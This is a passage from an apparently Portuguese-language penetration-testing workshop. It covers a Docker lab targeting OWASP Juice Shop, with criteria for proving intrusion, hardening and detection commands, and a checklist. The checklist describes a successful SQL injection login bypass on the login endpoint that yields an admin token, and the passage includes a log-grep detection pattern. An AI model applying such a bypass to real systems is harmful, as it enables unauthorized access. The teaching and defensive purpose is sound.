| vAPI `172.18.0.40` | HTTP responde, mas API retornou erro de banco no teste | Nao usar como exploracao principal nesta aula |
| Juice Shop `172.18.0.30:3000` | HTTP responde e login bypass funcionou | Usar como exploracao final |

**Analise:** isso e exatamente o que queremos ensinar. Nem toda porta vira ataque. Nem todo container vulneravel esta operacional. Nem todo script NSE entrega uma conclusao. A maturidade esta em selecionar o proximo passo a partir da evidencia.

### 8.1 Criterios para afirmar que a invasao e possivel

Antes de dizer que uma invasao e possivel, precisamos sair da suspeita e entrar em evidencia. Para este laboratorio, os pontos importantes sao:

- O alvo esta acessivel a partir do container atacante.
- A porta `3000/tcp` responde com `HTTP/1.1 200 OK`.
- A aplicacao foi identificada como `OWASP Juice Shop`.
- Existe um endpoint de autenticacao acessivel em `/rest/user/login`.
- O endpoint aceita corpo JSON controlado por quem faz a requisicao.
- Uma entrada manipulada no campo `email` altera o comportamento esperado da autenticacao.
- A resposta retorna `HTTP 200 OK`, `token` e `umail":"admin@juice-sh.op"`.
- As evidencias foram salvas em arquivos dentro de `/tmp/evidencias/workshop-03`.

**Analise:** porta aberta nao prova invasao. Banner nao prova invasao. Titulo HTTP nao prova invasao. A prova comeca quando conseguimos demonstrar controle de entrada, comportamento vulneravel e impacto observavel. Neste caso, o impacto e autenticacao administrativa sem conhecer a senha real.

---

## 9. Mitigacao, Deteccao e Hardening

### 9.1 Reduzir exposicao de servicos Docker

Liste portas publicadas:

```bash
docker ps --format 'table {{.Names}}\t{{.Ports}}'
```

Revise portas em escuta no host:

```bash
ss -tulpn
```

**Mitigacao:** publique apenas o necessario. Para laboratorios, prefira rede host-only, firewall local e binding restrito. Evite expor aplicacoes vulneraveis em interfaces corporativas, VPNs amplas ou redes compartilhadas.

### 9.2 Corrigir SQL Injection

Controles tecnicos recomendados:

```text
- Usar queries parametrizadas ou prepared statements.
- Nunca concatenar entrada de usuario diretamente em SQL.
- Validar tipo, formato e tamanho de parametros no servidor.
- Aplicar menor privilegio ao usuario de banco da aplicacao.
- Registrar falhas de autenticacao e erros SQL de forma segura.
- Testar endpoints de autenticacao com DAST e revisao de codigo.
```

**Analise:** WAF pode reduzir ruido e bloquear alguns payloads, mas nao corrige uma aplicacao que monta SQL com entrada do usuario. A correcao real esta no codigo e na arquitetura de acesso a dados.

### 9.3 Endurecer respostas HTTP

Exemplos de cabecalhos defensivos:

```text
Content-Security-Policy: default-src 'self'
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Referrer-Policy: no-referrer
Permissions-Policy: payment=()
```

**Analise:** headers nao corrigem SQL Injection, mas reduzem outras classes de risco em aplicacoes web. Eles devem fazer parte de uma politica de hardening, nao de uma maquiagem para falhas de backend.

### 9.4 Detectar varredura e exploracao

Monitorar eventos Docker:

```bash
docker events
```

Revisar logs do Juice Shop:

```bash
docker logs --tail 100 lab_juice_shop
```

Buscar sinais de login e erro:

```bash
docker logs --tail 500 lab_juice_shop 2>&1 | grep -Ei 'login|error|sql|rest/user/login|admin@juice-sh.op'
```

Monitorar conexoes em tempo real:

```bash
ss -antp
```

**Analise:** em laboratorio, logs ajudam a conectar acao e evidencia. Em ambiente corporativo, esses eventos devem ir para SIEM ou plataforma de observabilidade, com contexto de origem, usuario, container, endpoint e volume de requisicoes.

---

## Checklist de Validacao da Aula

- Confirmei que estou no host `srvdocker01`.
- Confirmei acesso ao Docker Engine.
- Identifiquei o container `atacante_kali`.
- Validei `nmap` e `curl` dentro do container atacante.
- Listei containers, imagens, status e portas publicadas.
- Mapeei IPs internos dos containers.
- Identifiquei `lab_juice_shop` em `172.18.0.30`.
- Executei descoberta com `nmap -sn`.
- Validei o erro de sintaxe com IPs separados por virgula.
- Corrigi a lista de alvos usando IPs separados por espaco.
- Testei Redis com `redis-info` e registrei porta fechada.
- Testei MySQL com `mysql-info` e `mysql-empty-password`.
- Testei Juice Shop com scripts NSE HTTP.
- Coletei headers e HTML inicial com `curl`.
- Preparei payload JSON de login bypass.
- Executei login bypass por SQL Injection no Juice Shop.
- Registrei `HTTP 200 OK`, token e `admin@juice-sh.op` como evidencia.
- Discuti limites do Nmap, uso de `curl`, mitigacao e deteccao.

---

<p align="right">
  <sub></sub><br>
  <img src="https://hits.sh/github.com/charles-josiah/Aulas/blob/master/2026-04-Vulnerabilidades_e_Testes_de_Invasao/Workshops/03-Nmap_NSE_rede_docker_e_exploracao_juiceshop.md.svg?label=leituras&color=eeeeee&labelColor=f5f5f5" alt="contador de leituras">
</p>
